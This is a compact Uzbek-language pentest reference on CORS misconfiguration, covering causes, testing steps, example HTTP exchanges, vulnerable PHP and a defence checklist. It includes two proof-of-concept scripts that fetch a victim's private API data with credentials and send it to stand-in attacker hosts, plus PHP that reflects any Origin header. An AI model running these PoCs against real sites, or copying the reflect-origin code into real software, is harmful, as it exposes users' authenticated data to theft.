# CORS Misconfiguration

## 1. Ta'rif
CORS — sayt boshqa origin'ga ma'lumot berishni belgilaydi. Zaif konfig: ruxsat berish hamma origin'ga, credential'lar bilan → attacker boshqa sayt JS'idan API/verify data bilan o'qiy oladi.

## 2. Qayerdan kelib chiqadi
- `Access-Control-Allow-Origin: *` (credentials bilan emas)
- `Access-Control-Allow-Origin: null`
- Reflect `Origin` hammasini qaytaradi (ACAO: origin)
- Credentials: `Access-Control-Allow-Credentials: true` + `*` / reflect arbitrary
- Preflight `Access-Control-Allow-Methods/Headers` haddan ortiq
- Domain regex xato: `target.com.evil.com` qabul

## 3. Turlari
| Tur | Tavsif |
|-----|--------|
| Reflect all | localized ACAO |
| `*` + credentials | max |
| null origin | sandbox iframe / file:// |
| Regex misconfig | subdomain reference |
| Trust evil host | ACAO: attacker.net |
| Vary: Origin missing | cache poisoning (Web Cache) |

## 4. Metodologiya
1. Sensitive API request (auth data, personal) — Origin header:
   - `Origin: https://evil.com`
   - `Origin: null`, `Origin: https://target.com.evil.com`
   - `Origin: https://evil.com.target.com`
2. Response'da:
   - `ACAO: origin` (reflect) + `ACAC: true` → exploit
   - `ACAO: *` + `ACAC:true` → global (invalid per-spec lekin amalda)
3. PoC:
   ```html
   <script>
   fetch('https://target.com/api/me', {credentials:'include'})
     .then(r=>r.json())
     .then(d=>new Image().src='https://attacker/c?'+JSON.stringify(d));
   </script>
   ```
4. Preflight'da custom header (X-API-Key) ruxsatmi.
5. null-origin chunki: attacker iframe `srcdoc`/sandbox yoki `<meta name=referrer>` + `document.domain`.

## 5. PoC
```html
<!-- reflect origin + credentials -->
<script>
var x = new XMLHttpRequest();
x.open('GET', 'https://target.com/api/private', true);
x.withCredentials = true;
x.onload = function(){
  var d = JSON.parse(x.responseText);
  location.href = 'https://attacker.com/?d='+btoa(JSON.stringify(d));
};
x.send();
</script>
```

## 6. Request misollari
```
GET /api/me HTTP/1.1
Host: target.com
Cookie: session=abc
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
## 7. Zaif code misollari
```java/php
// ZAIF — reflect any origin
header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
header("Access-Control-Allow-Credentials: true");

// ZAIF — null
$origin = $_SERVER['HTTP_ORIGIN'];       // "null" qaytariladi raw
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] Credentials=true bo'lsa origin ro'yxati kerak, `*` yo'q
- [ ] Origin reflect (arbitrary) — boshqa origin'ga ishonchi
- [ ] `null` origin (iframe sandbox, data URL)
- [ ] Regex — `evil.com` qabul qilinamikin yoki substring
- [ ] Preflight headerlar: `X-Api-Key` bo'lsa custom header qo'shish
- [ ] OPTIONS response default `*` — amalda data o'qish bo'lsa
- [ ] `Vary: Origin` yo'q → Cache poisoning (xe cache-poisoning)
- [ ] Internal APIs: admin API ham sinash — ACAD qisqartirish

## 9. Himoya
- Allowlist exact origins (tam private), never reflect arbitrary
- `ACAO: specific origin` + `ACAC:true` only for trusted
- Include `Vary: Origin`; strict subdomain regex `(^|\.)target\.com$`
- Preflight minimal required headers/methods